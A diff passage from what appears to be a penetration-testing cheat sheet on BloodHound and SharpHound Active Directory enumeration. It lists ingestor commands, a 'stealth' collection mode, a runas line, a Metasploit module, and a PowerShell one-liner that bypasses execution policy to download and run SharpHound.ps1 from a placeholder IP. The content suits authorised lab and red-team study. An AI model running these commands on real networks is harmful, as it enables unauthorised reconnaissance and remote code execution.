+```
+
+## Tools
+
+### Bloodhound
+
+#### Ingestors
+
+```bash
+# Standard local execution
+./SharpHound.exe --CollectionMethods All,GPOLocalGroup
+Invoke-BloodHound -CollectionMethod All,GPOLocalGroup
+Invoke-BloodHound -CollectionMethod All -CompressData -RemoveCSV
+Invoke-BloodHound -CollectionMethod LoggedOn
+
+# Specify different domain and run in stealth mode and collect only RDP data
+Invoke-BloodHound --d <Domain> --Stealth --CollectionMethod RDP
+
+# Run in context of different user
+runas.exe /netonly /user:domain\user 'powershell.exe -nop -exec bypass'
+
+# Download and execute in memory
+powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('http://<IP>:/SharpHound.ps1');Invoke-BloodHound"
+
+# Metasploit
+use post/windows/gather/bloodhound     
+```
+
+### Custom Queries
+
+Add the queries below into BloodHound for further queries.
+
+-   **CompassSecurity:** [https://github.com/CompassSecurity/BloodHoundQueries](https://github.com/CompassSecurity/BloodHoundQueries)
+-   **Hausec:** [https://github.com/hausec/Bloodhound-Custom-Queries](https://github.com/hausec/Bloodhound-Custom-Queries)
+-   **Seajaysec:** [https://gist.github.com/seajaysec](https://gist.github.com/seajaysec)
+
+Replace the `customqueries.json` with one of the above files to update the custom queries within Bloodhound. Remember to restart Bloodhound after changing the JSON file.
+
+**Locate custom queries file**
+
+```bash
+sudo find / -type f -name customqueries.json 2>/dev/null
+```
+
+**Note:** Keep in mind that Bloodhound captures a 'snapshot' of the current state of Active Directory at the time of capture and as such results may change when captured again in the future.
+
+## Additional Notes
+
+If Constrained Language mode is enabled on the target Domain Controller, Powerview will be heavily restricted for Domain enumeration. However, the AD PowerShell module will not be limited and allow Domain enumeration to continue.
+
+## Lab Reviews:
+
+**Ryan412:** [https://github.com/ryan412/ADLabsReview](https://github.com/ryan412/ADLabsReview)
